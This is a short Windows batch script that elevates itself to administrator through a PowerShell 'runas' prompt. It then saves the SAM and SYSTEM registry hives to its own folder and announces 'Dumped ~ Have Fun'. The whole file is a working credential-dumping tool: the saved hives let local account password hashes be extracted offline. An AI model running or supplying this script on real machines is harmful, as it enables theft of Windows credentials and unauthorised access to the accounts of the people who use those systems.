@echo off
color b
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit)
%~d0
cd %~dp0
reg.exe save HKLM\SAM SAM
reg.exe save HKLM\SYSTEM SYSTEM
echo Dumped ~ Have Fun
pause
